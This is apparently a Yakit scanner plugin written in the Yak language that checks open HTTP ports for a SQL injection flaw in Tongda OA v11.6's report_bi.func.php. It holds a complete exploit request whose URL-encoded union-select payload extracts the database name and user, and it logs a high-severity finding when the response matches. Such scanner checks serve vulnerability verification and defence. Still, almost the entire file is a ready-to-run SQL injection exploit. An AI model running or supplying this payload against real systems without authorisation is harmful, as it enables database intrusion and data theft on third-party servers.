# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port, payload){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
POST {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Go-http-client/1.1
Content-Length: 113
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&
`
    println(payload)
    rsp,req,_ = poc.HTTP(packet, 
    poc.params({"target":addr,"payload":payload}),
    poc.https(isTls),
    poc.redirectTimes(0),
    // poc.proxy("http://127.0.0.1:8083"),
    )
    if len(rsp) > 0 {
        if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`) && str.MatchAllOfSubString(rsp, `para`){ 
            yakit.Info("%v 通达OA v11.6 report_bi.func.php SQL注入漏洞", addr)
            risk.NewRisk(
            addr,risk.title("通达OA v11.6 report_bi.func.php SQL注入漏洞"),
            risk.severity("high"),
            risk.titleVerbose("通达OA v11.6 report_bi.func.php SQL注入漏洞存在"),
            risk.type("SQL注入[通达OA]"),
            risk.request(string(req)),
            risk.response(string(rsp)),
        )
        }
       
    }

    return
}
handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }
    payload = `/general/bi_design/appcenter/report_bi.func.php`

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port, payload)
    }
    
}
